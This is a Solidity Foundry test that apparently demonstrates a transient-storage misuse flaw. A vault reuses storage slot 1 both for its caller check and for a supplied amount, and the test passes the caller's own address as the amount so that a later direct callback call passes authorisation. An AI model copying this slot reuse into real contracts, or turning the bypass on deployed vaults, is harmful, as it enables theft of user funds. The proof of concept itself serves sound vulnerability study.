// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SimpleVault {
    // mint function
    function mint(uint256 amountToDeposit) external returns (uint256) {
        // Write vault address (address(this)) to transient storage
        address vault = address(this);
        assembly {
            tstore(1, vault)
        }

        // Directly call own callback function
        this.SwapCallback(amountToDeposit, "");

    }

    // Simulate SwapCallback callback function
    function SwapCallback(uint256 amount ,bytes calldata data) external {
        // Read vault address from transient storage
        address vault;
        assembly {
            vault := tload(1)
        }

        // Check if caller is a legitimate vault
        require(msg.sender == vault, "Not authorized");

        if (vault == address(this)) {
            // Output vault address for observation
            console.log("vault address:", vault);
            // Write the returned amount to transient storage
            assembly {
                tstore(1, amount)
            }
        } else {
            console.log("Manipulated vault address:", vault);
        }
    }

}

contract TransientStorageMisuseTest is Test {
    SimpleVault vault;

    function setUp() public {
        vault = new SimpleVault();
    }

    function testStorageOperation() public {
        // First, let's check what address we want to get
        console.log("Target address:", address(this));

        // Convert the address to uint256
        uint256 amount = uint256(uint160(address(this)));
        emit log_named_uint("Amount needed", amount);

        // Now use this amount in the mint function
        vault.mint(amount);

        vault.SwapCallback(0, "");
    }
}